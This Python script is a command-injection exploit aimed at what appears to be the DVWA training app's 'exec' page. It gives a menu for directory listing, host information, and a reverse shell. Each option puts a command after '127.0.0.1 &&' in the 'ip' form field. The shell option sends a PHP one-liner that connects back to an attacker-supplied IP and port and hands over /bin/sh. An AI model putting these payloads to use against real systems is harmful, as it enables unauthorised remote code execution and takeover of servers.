import requests
from bs4 import BeautifulSoup

url = "http://your_ip_here/vulnerabilities/exec/"  # URL Here

# Include your headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://your_ip_here/vulnerabilities/exec/",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://your_ip_here",
    "DNT": "1",
    "Connection": "close",
    "Cookie": "security=low; PHPSESSID=ge2i5ou0n58jrdsgl2gkc1u6p0; security=low",
    "Upgrade-Insecure-Requests": "1"
}

print("Options: Shell, DL (This is Directory Listing), HI (Host Information)")

u_input = input("What Would You Like To Do? ")

if u_input == "DL":
    payload = "127.0.0.1 && ls -la"
    
    data = {"ip": payload, "Submit": "Submit"}

    # Make the POST request
    response = requests.post(url, data=data, headers=headers)
    
    # Parse the response HTML
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find the <pre> tag
    pre_tag = soup.find('pre')
    
    if pre_tag:
        print("Found the <pre> tag:")
        print(pre_tag.text)
    else:
        print("No <pre> tag found in the response.")


if u_input == "HI":
    payload = "127.0.0.1 && uname -a"
    
    data = {"ip": payload, "Submit": "Submit"}

    # Make the POST request
    response = requests.post(url, data=data, headers=headers)
    
    # Parse the response HTML
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find the <pre> tag
    pre_tag = soup.find('pre')
    
    if pre_tag:
        print("Found the <pre> tag:")
        print(pre_tag.text)
    else:
        print("No <pre> tag found in the response.")


if u_input == "SHELL":
    payload = "127.0.0.1 && php -r '$sock=fsockopen(\"your_ip_here\",your_port_here);`/bin/sh <&3 >&3 2>&3`;'"

    data = {"ip": payload, "Submit": "Submit"}

    # Make the POST request
    response = requests.post(url, data=data, headers=headers)

    # Parse the response HTML
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find the <pre> tag
    pre_tag = soup.find('pre')

    if pre_tag:
        print("Found the <pre> tag:")
        print(pre_tag.text)
    else:
        print("No <pre> tag found in the response.")
